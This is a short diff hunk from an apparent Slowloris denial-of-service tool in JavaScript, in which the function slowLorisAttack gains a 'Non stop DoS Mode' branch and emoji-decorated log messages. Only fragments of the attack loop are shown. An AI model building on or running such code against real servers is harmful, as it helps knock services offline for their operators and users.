@@ -67,10 +67,14 @@ function slowLorisAttack(host, port, sockets, useHttps, sleepTime) {
         socketList.push(socket);
       }
     }
-  }, 1000);
+  }, 1000); // check
+
+  if (sleepTime === 0) {
+    return console.log("👿 Non stop DoS Mode");
+  }
 
   setInterval(() => {
-    console.log("Sleeping for 15 seconds");
+    console.log("🛌 Sleeping for 15 seconds");
   }, sleepTime * 1000);
 }
 
